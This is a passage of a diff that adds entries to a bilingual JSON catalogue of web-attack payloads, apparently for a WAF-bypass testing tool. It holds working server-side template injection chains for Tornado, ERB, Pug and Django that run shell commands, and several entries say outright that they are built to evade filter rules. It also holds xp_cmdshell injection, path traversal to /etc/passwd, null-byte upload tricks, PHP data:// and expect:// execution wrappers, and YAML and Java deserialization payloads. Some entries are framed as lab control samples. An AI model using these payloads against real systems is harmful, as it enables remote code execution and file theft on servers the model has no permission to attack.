+          "expectedCommand": "{{ len(\"TORNADO_G7\") }}",
+          "command": "{{ getattr(__import__('o'+'s'), 'pop'+'en')('id').read() }}",
+          "title": {
+            "zh": "getattr 拼接调用",
+            "en": "getattr Concatenated Invocation"
+          },
+          "description": {
+            "zh": "getattr 与拼接让 popen、os 等关键词不再连字出现，绕过对 os.popen 完整链的规则；表达式仍走模板 eval 语义。命中判据：输出 id 执行结果。",
+            "en": "getattr plus concatenation keeps the keywords os and popen from appearing unsplit, evading rules on the full os.popen chain while the expression stays inside template eval semantics. Success: the output of id."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "{{ escape(\"TORNADO_H8\") }}",
+          "command": "{% from subprocess import check_output %}{{ check_output(['id']).decode() }}",
+          "title": {
+            "zh": "from 导入子进程",
+            "en": "from-Import Subprocess"
+          },
+          "description": {
+            "zh": "{% from %} 语句把 subprocess.check_output 直接引入模板命名空间，调用面与 os.popen 特征差异化；参数列表执行不经 shell。命中判据：输出 uid。",
+            "en": "The from-import statement pulls subprocess.check_output straight into the template namespace, a call surface distinct from os.popen signatures; argument-list execution avoids a shell. Success: uid output."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti-django",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "{{ \"DJANGO_F6\"|length }}",
+          "command": "{% debug %}",
+          "title": {
+            "zh": "debug 标签上下文导出",
+            "en": "debug Tag Context Dump"
+          },
+          "description": {
+            "zh": "内建 {% debug %} 标签导出当前上下文与已导入模块信息，在 settings/环境读取被过滤时改走模板标签通道。命中判据：输出包含模板上下文与配置键名。",
+            "en": "The built-in debug tag dumps the live context and imported modules, a template-tag channel around filtered settings or environment reads. Success: output includes context keys and configuration names."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "{% if 7 == 7 %}DJANGO_G7{% endif %}",
+          "command": "{% include request.GET.payloader_tmpl %}",
+          "title": {
+            "zh": "变量 include 任意模板",
+            "en": "Variable include Arbitrary Template"
+          },
+          "description": {
+            "zh": "include 接受变量参数，模板名可由请求参数控制，绕过按静态路径编写的包含规则；需参数可控且路径可达，配合上传或日志可升级为 RCE。命中判据：指定模板内容被渲染。",
+            "en": "include accepts a variable argument so the template name is attacker-controlled, evading rules written for static include paths; needs a controllable parameter and a reachable path, pairing with upload or log placement for RCE. Success: the named template renders."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti-erb",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<%= \"ERB_\" + \"D4\" %>",
+          "command": "<%= %x(id) %>",
+          "title": {
+            "zh": "%x 反引号等价",
+            "en": "Backtick-Equivalent x Literal"
+          },
+          "description": {
+            "zh": "%x 字面量与反引号同义执行 shell 命令，规避对反引号字符与 system( 特征的规则。命中判据：输出 uid。",
+            "en": "The %x literal runs a shell command exactly like backticks while dodging rules that match the backtick character or the system( signature. Success: uid output."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "<%= %w[ERB E5].join(\"_\") %>",
+          "command": "<%= IO.popen('id').read %>",
+          "title": {
+            "zh": "IO.popen 管道读取",
+            "en": "IO.popen Pipe Read"
+          },
+          "description": {
+            "zh": "IO.popen 属核心 IO 层，调用面与 system、反引号特征差异化且支持读取回显。命中判据：输出 uid。",
+            "en": "IO.popen sits in the core IO layer, a call surface distinct from system and backtick signatures, and supports reading the echo. Success: uid output."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<%= {marker: \"ERB_F6\"}.fetch(:marker) %>",
+          "command": "<%= send(:system, 'id') %>",
+          "title": {
+            "zh": "send 符号间接调用",
+            "en": "send Symbol Indirect Call"
+          },
+          "description": {
+            "zh": "以符号经 send 间接分发调用，字面不含 system( 连写。命中判据：输出 uid。",
+            "en": "Dispatches the call through send with a symbol so the literal system( never appears unsplit. Success: uid output."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "ssti-pug",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "p= \"PUG_\" + \"F6\"",
+          "command": "p= global.process.mainModule.require('child_process').execSync('id').toString()",
+          "title": {
+            "zh": "缓冲代码执行",
+            "en": "Buffered Code Execution"
+          },
+          "description": {
+            "zh": "Pug 把 = 后内容编译为实时 JS 表达式求值输出；模板作用域无裸 require，经 global.process.mainModule 取回 require（Pug 经 Function 构造器编译，作用域为全局）。命中判据：渲染输出 uid。",
+            "en": "Pug compiles everything after = into a live JS expression; bare require is absent in template scope because Pug compiles through the Function constructor, so the chain fetches it via global.process.mainModule. Success: uid in rendered output."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "p= [\"PUG\",\"G7\"].join(\"_\")",
+          "command": "- var out = global.process.mainModule.require('child_process').execSync('whoami').toString()\np= out",
+          "title": {
+            "zh": "非缓冲代码行变体",
+            "en": "Unbuffered Code-Line Variant"
+          },
+          "description": {
+            "zh": "- 非缓冲行先行赋值、缓冲行再输出，字面结构差分于单行 p= 形态，同一 mainModule 链路。命中判据：输出当前用户名。",
+            "en": "An unbuffered line assigns first and a buffered line renders the result, a literal structure distinct from the single-line form over the same mainModule chain. Success: the current username in output."
+          },
+          "kind": "bypass"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "p(data-lab-marker=\"PUG_H8\") PUG_H8",
+          "command": "p #{global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()}",
+          "title": {
+            "zh": "插值调用变体",
+            "en": "Interpolation Invocation Variant"
+          },
+          "description": {
+            "zh": "#{} 插值经 Module 构造器 _load 取模块，与 mainModule.require 形态差异化；插值形态绕过按 p= / - 前缀编写的规则。命中判据：输出 flag 内容。",
+            "en": "Interpolation reaches the module through the Module constructor _load, diverging from the mainModule.require shape while the interpolation form dodges rules keyed on the buffered-code prefixes. Success: flag content in output."
+          },
+          "kind": "bypass"
+        }
+      ]
+    },
+    {
+      "id": "sqli2-sqlserver-xp-cmdshell-impact",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "EXEC xp_cmdshell 'whoami';--\nEXEC xp_cmdshell 'type C:\\Windows\\System32\\drivers\\etc\\hosts';--",
+          "description": {
+            "zh": "原行用于说明影响。真实验证将 whoami/type 替换为只输出随机固定标记和读取专用标记文件的命令，并只执行一次。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "The original lines document impact. Real validation replaces whoami and type with one fixed random-marker output and a dedicated marker-file read and executes once. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-path-traversal-filter-differentials",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd\nhttp://{LAB_APP}/test.asp?file=.%./bla.txt\nhttp://{LAB_APP}/?vulnparam=../../../../../etc/passwd&ithemes-sync-request\nhttp://{LAB_APP}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
+          "description": {
+            "zh": "保留原集合中的重复测试集，用于修复后对 WAF 规范化与后端根目录校验分别做回归。受控样例：用于建立基线/对照，非独立绕过手法。内容为与执行集一致的边界回归素材，用于修复后回归比对。",
+            "en": "Preserves the duplicate original test set for separate post-fix regression of WAF normalization and backend root enforcement. Control sample: establishes a baseline for comparison and is not a standalone bypass technique. The content is a regression set identical to the execution set, kept for post-fix retesting comparisons."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-iis-cgi-double-encoded-traversal",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "http://{LAB_APP}/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\\",
+          "description": {
+            "zh": "保留原集合中的重复复测行，用于修复后分别验证边界和 CGI 只执行一致的规范化。受控样例：用于建立基线/对照，非独立绕过手法。失效条件：仅 2003/XP 时代 IIS 5-6 的 CGI 二次解码差异或未打补丁的自研正则成立，现代 IIS 已修复；保留价值在教学历史。",
+            "en": "Preserves the original duplicate retest line for verifying consistent canonicalization at both edge and CGI after remediation. Control sample: establishes a baseline for comparison and is not a standalone bypass technique. Fails when: the CGI double-decode divergence holds only on era IIS 5-6 or unpatched custom rules, and modern IIS normalizes it; kept as teaching history."
+          },
+          "kind": "control",
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "rce-deserialize-php",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "public: s:3:\"cmd\" \n private: s:10:\"\\0Class\\0cmd\" \n protected: s:6:\"\\0*\\0cmd\"",
+          "description": {
+            "zh": "对照 public、private、protected 属性在序列化串中的 NUL 前缀与长度写法，验证手工构造属性名字段时的字节口径。受控样例：用于建立基线/对照，非独立绕过手法。public/private/protected 序列化前缀属构造载荷时的对照参考资料。",
+            "en": "Compare how public, private, and protected property names appear with NUL prefixes and lengths in serialized strings, pinning down the byte convention for hand-crafted property names. Control sample: establishes a baseline for comparison and is not a standalone bypass technique. The public/private/protected serialization prefixes are reference material consulted while building payloads."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "rce-deserialize",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "openssl dgst -sha256 -hmac \"{LAB_SIGNING_KEY}\" ./payload.ser",
+          "description": {
+            "zh": "拿到 HMAC 密钥后对伪造的 payload.ser 重算 SHA-256 HMAC，验证已知密钥时签名校验逻辑会接受伪造的反序列化数据。受控样例：用于建立基线/对照，非独立绕过手法。HMAC 重签名属应用层签名校验绕过，前提是签名密钥已泄露或可控，不触碰请求层 WAF。",
+            "en": "Recompute the SHA-256 HMAC over the forged payload.ser once the key is known, verifying signature checks accept forged data when the key has leaked. Control sample: establishes a baseline for comparison and is not a standalone bypass technique. HMAC re-signing bypasses application-layer signature verification and presumes the signing key is known; it never touches a request-layer WAF."
+          },
+          "kind": "control",
+          "syntaxBreakdown": [
+            {
+              "part": "openssl dgst -sha256",
+              "explanation": {
+                "zh": "以 SHA256 计算载荷摘要",
+                "en": "Computes the SHA-256 digest of the payload"
+              },
+              "type": "function"
+            },
+            {
+              "part": "-hmac \"{LAB_SIGNING_KEY}\"",
+              "explanation": {
+                "zh": "以已知签名密钥做 HMAC 重签",
+                "en": "Re-signs with the known signing key via HMAC"
+              },
+              "type": "value"
+            },
+            {
+              "part": "./payload.ser",
+              "explanation": {
+                "zh": "待重签名的序列化载荷文件",
+                "en": "Serialized payload file to re-sign"
+              },
+              "type": "value"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "rce-deserialize-java",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "java -jar ysoserial.jar CommonsCollections1 \"id\" > ./payload.ser",
+          "description": {
+            "zh": "生成执行 id 的 payload.ser 供投递到目标反序列化点，以命令输出验证链可用性。受控样例：用于建立基线/对照，非独立绕过手法。生成器侧前置准备：仅本地生成测试载荷文件，不触碰目标侧过滤或解析逻辑。",
+            "en": "Generate payload.ser running id for delivery to the target deserialization sink, confirming the chain works by its output. Control sample: establishes a baseline for comparison and is not a standalone bypass technique. Generator-side preparation: produces the payload file locally and never touches target-side filtering or parsing."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "java --add-opens java.base/java.util=ALL-UNNAMED -jar ysoserial.jar CommonsCollections1 \"id\" > ./payload.ser",
+          "description": {
+            "zh": "高版本 JDK 的模块封装会阻断 CC 链的反射调用，先以 --add-opens 打开 java.util 包再生成载荷，验证绕过模块限制的生成方式。受控样例：用于建立基线/对照，非独立绕过手法。生成器侧兼容性准备：--add-opens 仅作用于本地 ysoserial 运行，不触碰目标侧。",
+            "en": "Newer JDK module encapsulation blocks the reflective calls CC chains need; open java.util with --add-opens before generating, verifying the workaround for module restrictions. Control sample: establishes a baseline for comparison and is not a standalone bypass technique. Generator-side compatibility preparation: --add-opens applies to the local ysoserial run only and never touches the target."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "file-upload-windows-trailing-name",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "python3 - <<'PY'\nimport tempfile\nfrom pathlib import Path\nimport requests\n\nBASE = \"http://127.0.0.1:8080\"\nnames = [\n    \"PAYLOADER_MARKER.txt.\",\n    \"PAYLOADER_MARKER.txt \",\n    \"PAYLOADER_MARKER.txt::$DATA\",\n    \"PAYLOADER_MARKER.TXT\",\n    \"PAYLOADER_MARKER.txt\" + \"/./\" * 64,\n]\nwith tempfile.TemporaryDirectory(prefix=\"payloader-name-\") as directory:\n    marker = Path(directory) / \"PAYLOADER_MARKER.txt\"\n    marker.write_text(\"PAYLOADER_MARKER\", encoding=\"utf-8\")\n    for name in names:\n        with marker.open(\"rb\") as handle:\n            response = requests.post(f\"{BASE}/upload\", files={\"file\": (name, handle, \"text/plain\")}, timeout=3)\n        print(repr(name), response.status_code)\nPY\n",
+          "description": {
+            "zh": "逐个上传尾随点、尾随空格、::$DATA、大写与 /./ 长路径五种变体并打印状态码，验证服务端折叠后的最终存储名。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Uploads trailing-dot, trailing-space, ::$DATA, uppercase, and /./ long-path variants one by one while printing status codes, revealing the final stored names after backend folding. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "file-upload-ntfs-ads-name",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "PAYLOADER_MARKER.txt. . . .",
+          "command": "PAYLOADER_MARKER.txt::$DATA\nPAYLOADER_MARKER.txt:payloader:$DATA\nPAYLOADER_MARKER.php::$INDEX_ALLOCATION\nPAYLOADER_MARKER.php%00.txt\nPAYLOA~1.TXT",
+          "title": {
+            "zh": "NTFS ADS 名称解析对照块",
+            "en": "NTFS ADS Name Resolution Matrix"
+          },
+          "description": {
+            "zh": "NTFS ADS 名称边界验证块 1 — 对照 ::$DATA、命名流、::$INDEX_ALLOCATION、%00 截断与 PAYLOA~1 短名变体，验证应用层与 NTFS 层对同一名称的不同解释。受控样例：用于建立基线/对照，非独立绕过手法。条目为命名解析对照夹具，五类名称变体已与描述逐项对齐。",
+            "en": "Contrasts ::$DATA, named streams, ::INDEX_ALLOCATION, %00 truncation, and the PAYLOA~1 short name, showing the application layer and NTFS interpret the same name differently. Control sample: establishes a baseline for comparison and is not a standalone bypass technique. The entry is a name-resolution comparison fixture; the five name variants now match the description item by item."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "file-upload-declared-type-mismatch",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 5,
+          "expectedCommand": "Content-Type: text/plain\nContent-Type: application/octet-stream",
+          "description": {
+            "zh": "以 text/plain 与 application/octet-stream 两种声明上传同一 marker，验证服务端直接采信声明类型而不校验实际内容的差异。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Uploads the same marker declared as text/plain and application/octet-stream, showing the server trusts the declared type without validating actual content. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "fileup-null-php",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "BASE=\"http://127.0.0.1:8080\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?page=PAYLOADER_MARKER\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?page=../fixtures/PAYLOADER_MARKER%00\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?page=../fixtures/MISSING_MARKER%00\"\nprintf \"%s\\n\" \"compare parser log, canonical path, and exact PAYLOADER_MARKER output\"",
+          "description": {
+            "zh": "以 marker 正例与 MISSING 负例对照发送 %00 截断路径，验证 %00 截断在当前运行时的实际效果并比对解析日志。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Sends %00-truncated paths with a marker positive case and a MISSING negative control, verifying the real effect of %00 truncation on the current runtime via parser logs. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "../../../etc/passwd%00.html%00.php",
+          "description": {
+            "zh": "绕过对单扩展校验逻辑：多个空字节与扩展叠加触发不同解析路径；passwd 内容返回即成功。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Stack null bytes with multiple extensions against single-extension validation; returned passwd content confirms success. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 4,
+          "expectedCommand": "page=%2e%2e%2fshell%00",
+          "description": {
+            "zh": "编码遍历加截断。判据：越目录包含成功。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Encoded traversal plus truncation. Success: cross-directory include works. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 5,
+          "expectedCommand": "page=php://filter/resource=config%00",
+          "description": {
+            "zh": "过滤器内截断白名单后缀。判据：读出 config 源码。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Truncates inside the filter wrapper. Success: config source read. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "fileup-php-data-wrapper-include-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "data://text/plain;base64,PD9waHAgaW5jbHVkZSgnL2ZsYWcnKTsgPz4=\ndata://text/plain;base64,PD9waHAgZWNobyhmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7ID8+\ndata://text/plain;base64,PD9waHAgc2hvd19zb3VyY2UoJy9ldGMvcGFzc3dkJyk7ID8+\ndata://text/plain;base64,PD9waHAgcHJpbnRfcihzY2FuZGlyKCcuJykpOyA/Pg==\ndata://text/plain;base64,PD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFXyk7ID8+\ndata://text/plain;base64,PD9waHAgZmlsZV9nZXRfY29udGVudHMoJy9mbGFnJyk7ID8+\ndata://text/plain;base64,PD9waHAgcmVhZGZpbGUoJy9mbGFnJyk7ID8+\ndata://text/plain;base64,PD9waHAgZWNobyhmaWxlKCcvZmxhZycpKTsgPz4=\ndata://text/plain,<?php system('id'); ?>\ndata://text/plain,<?php include('/flag'); ?>\ndata://text/plain,<?php echo(file_get_contents('/flag')); ?>\ndata://text/plain,<?php show_source('/etc/passwd'); ?>\ndata://text/plain,<?php print_r(scandir('.')); ?>\ndata:text/plain;base64,PD9waHAgaW5jbHVkZSgnL2ZsYWcnKTsgPz4=\ndata:text/plain;base64,PD9waHAgZWNobyhmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7ID8+",
+          "description": {
+            "zh": "原行保留用于审校。实际验证选择一行并将其解码/明文内容改为 `<?php echo 'MARKER'; ?>`，不读取文件、不列目录、不执行系统命令。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "The original lines are retained for review. For validation choose one and replace decoded or plain content with a fixed PHP marker echo, with no file read, directory listing, or OS command. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 10,
+          "expectedCommand": "data://text/plain,<?php phpinfo();?>\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
+          "description": {
+            "zh": "原始内容不得直接执行。把三条分别重写为同一随机标记输出，用于比较明文与 Base64 传输差异。命中判据：重写后的 data 流被包含并输出同一随机标记。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Do not execute the original content. Rewrite all three forms to emit the same random marker and use them only to compare plaintext with Base64 transport. Success check: the rewritten data stream is included and prints the same random marker. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "fileup-php-expect-wrapper-extension-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "expect://whoami\nexpect://cat /flag\nexpect://ls /\nexpect://pwd",
+          "description": {
+            "zh": "原行仅说明命令边界。真实验证选择一行并替换为只输出随机固定标记的无害测试程序，不运行 whoami/cat/ls/pwd。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "The original lines document the command boundary. For validation choose one and replace it with a harmless test program that emits a random fixed marker; do not run whoami, cat, ls, or pwd. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 10,
+          "expectedCommand": "expect://cat /etc/passwd",
+          "description": {
+            "zh": "该危险原行只作来源记录；实际执行必须替换为 expect://marker-helper，并由进程策略保证仅输出随机标记。命中判据：marker-helper 的随机标记出现在响应中。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "This dangerous original is retained only as a source record; actual execution must use expect://marker-helper, with process policy restricting it to random-marker output. Success check: the marker-helper's random marker appears in the response. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "rce-file-upload",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "curl --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-f6\" -F \"file=@fixtures/upload-marker.txt;filename=marker.jpg;type=image/jpeg\" | jq -e '.accepted == false and .detected_type == \"text/plain\"'",
+          "description": {
+            "zh": "以 image/jpeg 声明上传纯文本内容，断言服务端按实际内容判型为 text/plain 且不因声明类型放行。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Upload text content declared as image/jpeg and assert the server rejects it while detecting text/plain from the actual content. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "curl --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-g7\" -F \"file=@fixtures/gif89a-marker.bin;filename=marker.txt;type=text/plain\" | jq -e '.accepted == false and .detected_type == \"image/gif\"'",
+          "description": {
+            "zh": "把 GIF 头内容以 marker.txt、text/plain 上传，断言服务端按文件头判型为 image/gif 并拒绝该文件。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Upload GIF-header content as marker.txt declared text/plain and assert the server detects image/gif from the header and rejects the file. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "nosql2-yaml",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 10,
+          "expectedCommand": "!!python/object/apply:subprocess.check_output [['cat','/etc/passwd']]",
+          "description": {
+            "zh": "危险原行仅作来源记录；执行前把参数数组替换为签名 marker-helper，禁止读取 /etc/passwd 或运行任意命令。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "The dangerous original is retained only for source traceability; replace its argument array with the signed marker-helper before execution and never read /etc/passwd or run an arbitrary command. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "webshell-asp-aspx",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 3,
+          "expectedCommand": "<%= \"test\" %>",
+          "description": {
+            "zh": "保留源中的第二份同一行以比较 WAF 前后字节；输出 test 只证明表达式解释，不证明安全控制被绕过。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Preserves the source's second copy to compare bytes before and after the WAF; emitting test proves expression interpretation only, not a security-control bypass. Control sample: establishes a baseline for comparison and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "file-download-legacy-terminator",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "?file=%2e%2e%2fetc%2fpasswd%00",
+          "description": {
+            "zh": "整体编码绕过明文 ../ 规则。判据：读出文件。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Everything encoded. Success: file read. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "?file=../../etc/passwd%2500",
+          "description": {
+            "zh": "二次解码还原 %00 截断白名单后缀。判据：返回内容。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Second decode restores truncation. Success: content returned. Fails when: only holds on architectures that perform a second URL decode."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "file-traversal-legacy-terminator",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "..\\..\\windows\\win.ini%00.jpg",
+          "description": {
+            "zh": "Windows 分隔符加截断。判据：读出文件。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Windows separators plus truncation. Success: file read. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "..%2f..%2fetc%2fpasswd%2500",
+          "description": {
+            "zh": "双重解码还原截断。判据：返回 passwd。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double decode restores truncation. Success: passwd returned. Fails when: only holds on architectures that perform a second URL decode."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "file-archive-filename-encoding-differential",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "x%00.php",
+          "description": {
+            "zh": "截断名内后缀。判据：落盘文件后缀变化。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Truncates the stored suffix. Success: on-disk suffix changes. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "file-upload-null-byte-filename",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "filename=\"shell%00.php\"",
+          "description": {
+            "zh": "空字节置于主名内绕过位置检测。判据：落盘后缀为 php。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Null inside the base name. Success: stored suffix becomes .php. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "filename=\"shell.ph\\x00p\"",
+          "description": {
+            "zh": "扩展名中间截断重组。判据：后缀还原为 php。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Splits and rejoins the extension. Success: suffix restored to php. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "auth2-session-id-path-traversal",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "JSESSIONID=../../../../etc/passwd%00",
+          "description": {
+            "zh": "空字节去除默认后缀。判据：读到 passwd。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Null byte strips the default suffix. Success: passwd read. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "bizlogic-npm-package-json",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/package.json%00",
+          "description": {
+            "zh": "截断绕过精确匹配。判据：返回 JSON。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Trailing null. Success: JSON returned. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "bizlogic-python-requirements-txt",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/requirements.txt%00",
+          "description": {
+            "zh": "截断绕过。判据：返回依赖清单。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
+            "en": "Trailing null. Success: manifest returned. Fails when: holds only on PHP below 5.3.4 or custom C-level truncation; modern parsers reject null bytes in paths."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "bizlogic-php-composer-json",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/composer.json%00",
+          "description": {
+            "zh": "截断绕过精确规则。判据：返回 JSON。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。",
